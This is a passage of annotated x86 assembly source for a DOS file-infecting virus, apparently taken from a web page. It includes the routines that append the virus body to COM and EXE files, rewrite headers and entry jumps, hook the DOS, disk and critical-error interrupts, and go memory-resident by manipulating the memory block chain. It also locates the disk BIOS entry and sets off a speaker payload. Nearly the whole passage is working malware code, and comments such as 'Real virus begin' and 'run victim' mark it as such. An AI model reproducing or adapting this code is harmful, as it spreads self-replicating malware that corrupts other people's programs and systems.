	jne	l_01DA					;01D2  75 06
	cmp	ax,4FDh					;01D4  3D 04FD
	nop						;01D7  90
	jz	l_0244					;01D8  74 6A
l_01DA:	mov	dx,bp					;01DA  8B D5
	mov	ax,di					;01DC  8B C7
	push	dx					;01DE  52
	push	ax					;01DF  50
	add	ax,4FDh					;01E0  05 04FD
	nop						;01E3  90
	adc	dx,0					;01E4  83 D2 00
	mov	cx,200h					;01E7  B9 0200
	div	cx					;01EA  F7 F1
	les	di,dword ptr [si+2]			;01EC  C4 7C 02
	mov	word ptr cs:[125h],di			;01EF  2E: 89 3E 0125
	mov	word ptr cs:[127h],es			;01F4  2E: 8C 06 0127
	mov	[si+2],dx				;01F9  89 54 02
	cmp	dx,0					;01FC  83 FA 00
	je	l_0202					;01FF  74 01
	inc	ax					;0201  40
l_0202:	mov	[si+4],ax				;0202  89 44 04
	pop	ax					;0205  58
	pop	dx					;0206  5A
	call	s_0245					;0207  E8 003B
	sub	ax,[si+8]				;020A  2B 44 08
	les	di,dword ptr [si+14h]			;020D  C4 7C 14
	mov	word ptr ds:[11Bh],di			;0210  89 3E 011B
	mov	word ptr ds:[11Dh],es			;0214  8C 06 011D
	mov	[si+14h],dx				;0218  89 54 14
	mov	[si+16h],ax				;021B  89 44 16
	mov	word ptr ds:[11Fh],ax			;021E  A3 011F
	mov	ax,4202h				;0221  B8 4202
	xor	cx,cx					;0224  33 C9
	xor	dx,dx					;0226  33 D2
	call	s_02B6					;0228  E8 008B
	call	s_0256					;022B  E8 0028
	jc	l_0244					;022E  72 14
	mov	ax,4200h				;0230  B8 4200
	xor	cx,cx					;0233  33 C9
	xor	dx,dx					;0235  33 D2
	call	s_02B6					;0237  E8 007C
	mov	ah,40h			; '@'		;023A  B4 40
	mov	dx,si					;023C  8B D6
	mov	cx,18h					;023E  B9 0018
	call	s_02B6					;0241  E8 0072

l_0244:	retn						;0244  C3
s_0192	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

s_0245	proc	near
	mov	cx,4					;0245  B9 0004
	mov	di,ax					;0248  8B F8
	and	di,0Fh					;024A  83 E7 0F

l_024D:	shr	dx,1					;024D  D1 EA
	rcr	ax,1					;024F  D1 D8
	loop	l_024D					;0251  E2 FA

	mov	dx,di					;0253  8B D7
	retn						;0255  C3
s_0245	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

s_0256	proc	near
	mov	ah,40h			; '@'		;0256  B4 40
	mov	cx,4FDh					;0258  B9 04FD
	nop						;025B  90
	mov	dx,100h					;025C  BA 0100
	jmp	short l_02B6				;025F  EB 55
	db	90h					;0261  90

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßß

s_0262:
	mov	ax,4202h				;0262  B8 4202
	xor	cx,cx					;0265  33 C9
	xor	dx,dx					;0267  33 D2
	call	s_02B6					;0269  E8 004A
	cmp	ax,4FDh					;026C  3D 04FD
	nop						;026F  90
	jc	l_02B5					;0270  72 43
	cmp	ax,0FAE2h				;0272  3D FAE2
	nop						;0275  90
	jnc	l_02B5					;0276  73 3D
	push	ax					;0278  50
	cmp	byte ptr [si],0E9h			;0279  80 3C E9
	jne	l_028A					;027C  75 0C
	sub	ax,500h					;027E  2D 0500
	nop						;0281  90
	cmp	ax,[si+1]				;0282  3B 44 01
	jne	l_028A					;0285  75 03
	pop	ax					;0287  58
	jmp	short l_02B5				;0288  EB 2B
l_028A:	call	s_0256					;028A  E8 FFC9
	jnc	l_0292					;028D  73 03
	pop	ax					;028F  58
	jmp	short l_02B5				;0290  EB 23
l_0292:	mov	ax,4200h				;0292  B8 4200
	xor	cx,cx					;0295  33 C9
	xor	dx,dx					;0297  33 D2
	call	s_02B6					;0299  E8 001A
	pop	ax					;029C  58
	sub	ax,3					;029D  2D 0003
	mov	dx,11Bh					;02A0  BA 011B
	mov	si,dx					;02A3  8B F2
	mov	byte ptr cs:[si],0E9h			;02A5  2E: C6 04 E9
	mov	cs:[si+1],ax				;02A9  2E: 89 44 01
	mov	ah,40h			; '@'		;02AD  B4 40
	mov	cx,3					;02AF  B9 0003
	call	s_02B6					;02B2  E8 0001

l_02B5:	retn						;02B5  C3
s_0256	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

s_02B6	proc	near
l_02B6:	pushf						;02B6  9C
	call	dword ptr cs:[129h]			;02B7  2E: FF 1E 0129
	retn						;02BC  C3
s_02B6	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

s_02BD	proc	near
	push	ax					;02BD  50
	push	ds					;02BE  1E
	push	es					;02BF  06
	xor	ax,ax					;02C0  33 C0
	push	ax					;02C2  50
	pop	ds					;02C3  1F
	cli						;02C4  FA
	les	ax,dword ptr ds:[90h]		;int 24h	;02C5  C4 06 0090
	mov	word ptr cs:[12Dh],ax			;02C9  2E: A3 012D
	mov	word ptr cs:[12Fh],es			;02CD  2E: 8C 06 012F
	mov	ax,418h					;02D2  B8 0418
	mov	ds:[90h],ax			;int 24h	;02D5  A3 0090
	mov	word ptr ds:[90h+2],cs			;02D8  8C 0E 0092
	les	ax,dword ptr ds:[4Ch]		;int 13h	;02DC  C4 06 004C
	mov	word ptr cs:[135h],ax			;02E0  2E: A3 0135
	mov	word ptr cs:[137h],es			;02E4  2E: 8C 06 0137
	les	ax,dword ptr cs:[131h]			;02E9  2E: C4 06 0131
	mov	ds:[4Ch],ax			;int 13h	;02EE  A3 004C
	mov	word ptr ds:[4Ch+2],es			;02F1  8C 06 004E
	sti						;02F5  FB
	pop	es					;02F6  07
	pop	ds					;02F7  1F
	pop	ax					;02F8  58
	retn						;02F9  C3
s_02BD	endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

s_02FA	proc	near
	push	ax					;02FA  50
	push	ds					;02FB  1E
	push	es					;02FC  06
	xor	ax,ax					;02FD  33 C0
	push	ax					;02FF  50
	pop	ds					;0300  1F
	cli						;0301  FA
	les	ax,dword ptr cs:[12Dh]			;0302  2E: C4 06 012D
	mov	ds:[90h],ax			;int 24h;0307  A3 0090
	mov	word ptr ds:[90h+2],es			;030A  8C 06 0092
	les	ax,dword ptr cs:[135h]			;030E  2E: C4 06 0135
	mov	ds:[4Ch],ax			;int 13h;0313  A3 004C
	mov	word ptr ds:[4Ch+2],es			;0316  8C 06 004E
	sti						;031A  FB
	pop	es					;031B  07
	pop	ds					;031C  1F
	pop	ax					;031D  58
	retn						;031E  C3
s_02FA	endp

	test	ah,80h					;031F  F6 C4 80
	jz	l_0329					;0322  74 05
	jmp	dword ptr cs:[12Dh]			;0324  2E: FF 2E 012D
l_0329:	add	sp,6					;0329  83 C4 06
	pop	ax					;032C  58
	pop	bx					;032D  5B
	pop	cx					;032E  59
	pop	dx					;032F  5A
	pop	si					;0330  5E
	pop	di					;0331  5F
	pop	bp					;0332  5D
	pop	ds					;0333  1F
	pop	es					;0334  07
	push	bp					;0335  55
	mov	bp,sp					;0336  8B EC
	or	word ptr [bp+6],1			;0338  83 4E 06 01
	pop	bp					;033C  5D
	iret						;033D  CF

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

s_033E	proc	near
	mov	al,0B6h					;033E  B0 B6
	out	43h,al	; port 43h, 8253 wrt timr mode	;0340  E6 43
	mov	ax,64h					;0342  B8 0064
	out	42h,al	; port 42h, 8253 timer 2 spkr	;0345  E6 42
	mov	al,ah					;0347  8A C4
	out	42h,al	; port 42h, 8253 timer 2 spkr	;0349  E6 42
	in	al,61h	; port 61h, 8255 port B, read	;034B  E4 61
	or	al,3					;034D  0C 03
	out	61h,al	; port 61h, 8255 B - spkr, etc	;034F  E6 61
	retn						;0351  C3
s_033E	endp

;=======================================================
;
;-------------------------------------------------------
s_0352	proc	near
	push	ax						;0352  50
	push	cx						;0353  51
	push	dx						;0354  52
	push	ds						;0355  1E
	xor	ax,ax						;0356  33 C0
	push	ax						;0358  50
	pop	ds						;0359  1F
	mov	ax,ds:[46Ch]		;system timer lo part	;035A  A1 046C
	mov	dx,ds:[46Eh]		;system time hi part	;035D  8B 16 046E
	mov	cx,0FFFFh					;0361  B9 FFFF
	div	cx						;0364  F7 F1
	cmp	ax,0Ah						;0366  3D 000A
	jne	l_036E			;			;0369  75 03
	call	s_033E						;036B  E8 FFD0
l_036E:	pop	ds						;036E  1F
	pop	dx						;036F  5A
	pop	cx						;0370  59
	pop	ax						;0371  58
	retn							;0372  C3
s_0352	endp

;=======================================================
;	ax:=ax*10h
;-------------------------------------------------------
s_0373	proc	near
	mov	dx,10h						;0373  BA 0010
	mul	dx						;0376  F7 E2
	retn							;0378  C3
s_0373	endp

;=======================================================
;	clear all registers
;-------------------------------------------------------
s_0379	proc	near
	xor	ax,ax						;0379  33 C0
	xor	bx,bx						;037B  33 DB
	xor	cx,cx						;037D  33 C9
	xor	dx,dx						;037F  33 D2
	xor	si,si						;0381  33 F6
	xor	di,di						;0383  33 FF
	xor	bp,bp						;0385  33 ED
	retn							;0387  C3
s_0379	endp

;========================================================
;	Real virus begin
;--------------------------------------------------------
l_0388:	push	ds						;0388  1E
	call	s_038C						;0389  E8 0000
s_038C:	mov	ax,4B59h	;run progm @ds:dx, parm @es:bx	;038C  B8 4B59
	int	21h						;038F  CD 21
	jc	l_0396		;-> not resident yet		;0391  72 03
	jmp	l_04BE		;-> allready resident		;0393  E9 0128

l_0396:	pop	si		;=038Ch base address		;0396  5E
	push	si						;0397  56
	mov	di,si						;0398  8B FE
	xor	ax,ax						;039A  33 C0
	push	ax						;039C  50
	pop	ds						;039D  1F
	les	ax,dword ptr ds:[4Ch]	;int 13h		;039E  C4 06 004C
	mov	cs:[si-354h],ax		;=038h			;03A2  2E: 89 84 FCAC
	mov	cs:[si-352h],es		;=03Ah			;03A7  2E: 8C 84 FCAE
	les	bx,dword ptr ds:[84h]	;int 21h		;03AC  C4 1E 0084
	mov	cs:[di-35Ch],bx		;=030h			;03B0  2E: 89 9D FCA4
	mov	cs:[di-35Ah],es		;=032h			;03B5  2E: 8C 85 FCA6
	mov	ax,ds:[102h]		;int 40h+2 (BIOS FDD)	;03BA  A1 0102
	cmp	ax,0F000h					;03BD  3D F000
	jne	l_042B			;-> not standard BIOS	;03C0  75 69

	mov	dl,80h			;BIOS length (pages 512);03C2  B2 80
	mov	ax,ds:[106h]		;int 41h+2 (1 HDD ptr)	;03C4  A1 0106
	cmp	ax,0F000h					;03C7  3D F000
	je	l_03E8			;-> standard		;03CA  74 1C

	cmp	ah,0C8h			;Disk BIOS ?		;03CC  80 FC C8
	jb	l_042B			;-> not			;03CF  72 5A
	cmp	ah,0F4h			;Disk BIOS ?		;03D1  80 FC F4
	jae	l_042B			;-> not			;03D4  73 55
	test	al,7Fh			;page aligned		;03D6  A8 7F
	jnz	l_042B			;-> not			;03D8  75 51
	mov	ds,ax			;disk BIOS segment	;03DA  8E D8
	cmp	word ptr ds:[0],0AA55h	;BIOS sygnature ?	;03DC  81 3E 0000 AA55
	jne	l_042B			;-> not			;03E2  75 47
	mov	dl,ds:[2]		;BIOS length (pages 512);03E4  8A 16 0002

l_03E8:	mov	ds,ax			;HDD1 table segment	;03E8  8E D8
	xor	dh,dh						;03EA  32 F6
	mov	cl,9			;* 512			;03EC  B1 09
	shl	dx,cl						;03EE  D3 E2
	mov	cx,dx						;03F0  8B CA
	xor	si,si			;BIOS begin		;03F2  33 F6

	;-----------------------------------------------
	;Find:	cmp dl,80h	or	test dl,80h
	;	jae x			jnz x
	;	int 40h			int 40h
	;-----------------------------------------------
l_03F4:	lodsw							;03F4  AD
	cmp	ax,0FA80h		;"cmp dl,80h"		;03F5  3D FA80
	jne	l_0402						;03F8  75 08
	lodsw							;03FA  AD
	cmp	ax,7380h		;"jae .."		;03FB  3D 7380
	je	l_040D						;03FE  74 0D
	jnz	l_0417						;0400  75 15
l_0402:	cmp	ax,0C2F6h		;"test dl,80"		;0402  3D C2F6
	jne	l_0419						;0405  75 12
	lodsw							;0407  AD
	cmp	ax,7580h		;"jnz ..."		;0408  3D 7580
	jne	l_0417						;040B  75 0A
l_040D:	inc	si						;040D  46
	lodsw							;040E  AD
	cmp	ax,40CDh		;"int 40h"		;040F  3D 40CD
	je	l_041E						;0412  74 0A
	sub	si,3						;0414  83 EE 03
l_0417:	dec	si						;0417  4E
	dec	si						;0418  4E
l_0419:	dec	si						;0419  4E
	loop	l_03F4						;041A  E2 D8
	jmp	short l_042B		;-> entry not found	;041C  EB 0D

				;<- BIOS entry found
l_041E:	sub	si,7						;041E  83 EE 07
	mov	cs:[di-354h],si		;=038h int 13h offset	;0421  2E: 89 B5 FCAC
	mov	cs:[di-352h],ds		;=03Ah	       segment	;0426  2E: 8C 9D FCAE

l_042B:	mov	ah,62h		;get progrm seg prefix addr bx	;042B  B4 62
	int	21h						;042D  CD 21

	mov	es,bx		;PSP				;042F  8E C3
	mov	ah,49h		;release memory block, es=seg	;0431  B4 49
	int	21h						;0433  CD 21

	mov	bx,0FFFFh	;bytes				;0435  BB FFFF
	mov	ah,48h		;allocate memory, bx=bytes/16	;0438  B4 48
	int	21h						;043A  CD 21

	sub	bx,51h		;- virus length (paragraphs)	;043C  81 EB 0051
	jc	l_04BE		;-> not enought memory		;0440  72 7C
	mov	cx,es						;0442  8C C1
	stc							;0444  F9
	adc	cx,bx						;0445  13 CB
	mov	ah,4Ah		;change mem allocation, bx=siz	;0447  B4 4A
	int	21h						;0449  CD 21
			
	mov	bx,50h		;virus length (para)		;044B  BB 0050
	nop							;044E  90
	stc							;044F  F9
	sbb	es:[2],bx	;Top of Memory			;0450  26: 19 1E 0002
	push	es						;0455  06
	mov	es,cx						;0456  8E C1
	mov	ah,4Ah		;change mem allocation, bx=siz	;0458  B4 4A
	int	21h						;045A  CD 21
			
	mov	ax,es						;045C  8C C0
	dec	ax						;045E  48
	mov	ds,ax						;045F  8E D8
	mov	word ptr ds:[1],8				;0461  C7 06 0001 0008
	call	s_0373			;ax,dx:=ax*10h		;0467  E8 FF09
	mov	bx,ax						;046A  8B D8
	mov	cx,dx						;046C  8B CA
	pop	ds			;PSP segment		;046E  1F
	mov	ax,ds						;046F  8C D8
	call	s_0373			;ax,dx:=ax*10h		;0471  E8 FEFF
	add	ax,ds:[6]		;Available memory	;0474  03 06 0006
	adc	dx,0						;0478  83 D2 00
	sub	ax,bx						;047B  2B C3
	sbb	dx,cx						;047D  1B D1
	jc	l_0485						;047F  72 04
	sub	ds:[6],ax		;new available memory	;0481  29 06 0006

l_0485:	mov	si,di						;0485  8B F7
	xor	di,di						;0487  33 FF
	push	cs						;0489  0E
	pop	ds						;048A  1F
	sub	si,385h			;=007h			;048B  81 EE 0385
	mov	cx,4FDh			;=till 504h		;048F  B9 04FD
	nop							;0492  90
	inc	cx						;0493  41
	rep	movsb						;0494  F3/ A4
	mov	ah,62h		;get progrm seg prefix addr bx	;0496  B4 62
	int	21h						;0498  CD 21
			
	dec	bx						;049A  4B
	mov	ds,bx						;049B  8E DB
	mov	byte ptr ds:[0],'Z'	;End of mem blocks chain;049D  C6 06 0000 5A
	mov	dx,1B9h			;=1C0h int 21h entry	;04A2  BA 01B9
	xor	ax,ax						;04A5  33 C0
	push	ax						;04A7  50
	pop	ds						;04A8  1F
	mov	ax,es						;04A9  8C C0
	sub	ax,10h			;arena header		;04AB  2D 0010
	mov	es,ax						;04AE  8E C0
	cli							;04B0  FA
	mov	ds:[84h],dx		;int 21h offset (1C0h)	;04B1  89 16 0084
	mov	word ptr ds:[84h+2],es	;=virus segment-10h	;04B5  8C 06 0086
	sti							;04B9  FB
	dec	byte ptr ds:[47Bh]				;04BA  FE 0E 047B

			;<- "virus allready resident" entry
l_04BE:	pop	si				;=38Ch		;04BE  5E
	cmp	word ptr cs:[si-382h],'ZM'	;=00Ah		;04BF  2E: 81 BC FC7E 5A4D
	jne	l_04E5				;-> COM		;04C6  75 1D
				;<- EXE
	pop	ds			;entry DS		;04C8  1F
	mov	ax,cs:[si-366h]		;=026h virus segment	;04C9  2E: 8B 84 FC9A
	mov	bx,cs:[si-368h]		;=024h victim entry CS	;04CE  2E: 8B 9C FC98
	push	cs						;04D3  0E
	pop	cx						;04D4  59
	sub	cx,ax			;reloc value		;04D5  2B C8
	add	cx,bx			;victim entry CS	;04D7  03 CB
	push	cx						;04D9  51
	push	word ptr cs:[si-36Ah]	;=0022h victim entry IP	;04DA  2E: FF B4 FC96
	push	ds						;04DF  1E
	pop	es						;04E0  07
	call	s_0379			;clear all registers	;04E1  E8 FE95
	retf				;run victim		;04E4  CB

				;<- COM
l_04E5:	pop	ax			;entry DS		;04E5  58
	mov	ax,cs:[si-382h]		;=000A			;04E6  2E: 8B 84 FC7E
	mov	word ptr cs:[100h],ax				;04EB  2E: A3 0100
	mov	ax,cs:[si-380h]		;=000C			;04EF  2E: 8B 84 FC80
	mov	word ptr cs:[102h],ax				;04F4  2E: A3 0102
	mov	ax,100h			;COM entry point	;04F8  B8 0100
	push	ax						;04FB  50
	push	cs						;04FC  0E
	pop	ds						;04FD  1F
	push	ds						;04FE  1E
	pop	es						;04FF  07
	call	s_0379			;clear all registers	;0500  E8 FE76
	retn				;run victim		;0503  C3

seg_b	ends

	end	start

</textarea></td></tr></table></body></html>
